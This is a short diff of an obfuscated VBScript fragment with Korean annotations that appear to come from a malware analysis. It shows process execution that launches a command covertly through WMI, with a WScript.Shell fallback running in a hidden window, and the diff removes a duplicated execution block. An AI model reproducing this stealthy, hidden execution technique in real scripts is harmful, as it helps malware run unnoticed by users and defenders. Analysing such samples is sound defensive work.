@@ -58,18 +58,14 @@ Set wistit = exophthalmy.Get(echinocardium)
 ' ==========================================================
 ' [2] 프로세스 실행 (중복 로직 포함)
 ' ==========================================================
-' [실행 시도 1] WMI를 통한 은밀한 프로세스 생성
+' [실행 시도 ] WMI를 통한 은밀한 프로세스 생성
 ' 인자: (명령어, 현재디렉토리, 시작옵션객체, PID반환변수)
 lotus = wistit.Create(ballast, Null, Acadia, lithobiid) 
 
-' [실행 시도 1] WScript.Shell을 통한 폴백(Fallback) 실행
+' [실행 시도 ] WScript.Shell을 통한 폴백(Fallback) 실행
 ' 인자: (명령어, 창스타일(0=숨김), 대기여부(True))
 opsonies.Run ballast, 0, True 
 
-
-' [실행 시도 2] 상동 (난독화 과정에서 조건문이 제거되어 중복 실행됨)
-lotus = wistit.Create(ballast, Null, Acadia, lithobiid) 
-opsonies.Run ballast, 0, True 
 
 
 ' ==========================================================
